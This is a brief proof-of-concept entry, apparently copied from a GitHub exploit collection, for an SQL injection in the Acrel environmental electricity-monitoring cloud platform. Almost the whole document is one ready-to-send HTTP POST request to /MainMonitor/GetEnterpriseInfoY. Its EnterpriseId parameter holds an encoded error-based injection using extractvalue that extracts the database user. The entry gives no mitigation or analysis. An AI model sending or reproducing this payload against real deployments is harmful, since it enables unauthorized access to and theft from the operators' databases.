# AcrelCloud_etEnterpriseInfoY_sqli

from: https://github.com/wy876/POC/blob/main/%E5%AE%89%E7%A7%91%E7%91%9E/%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0etEnterpriseInfoY%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

product: 安科瑞环保用电监管云平台

```
POST /MainMonitor/GetEnterpriseInfoY HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/plain, */*; q=0.01

EnterpriseId=2107265665700008%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cuser%28%29%29%29and%27&Type=4
```
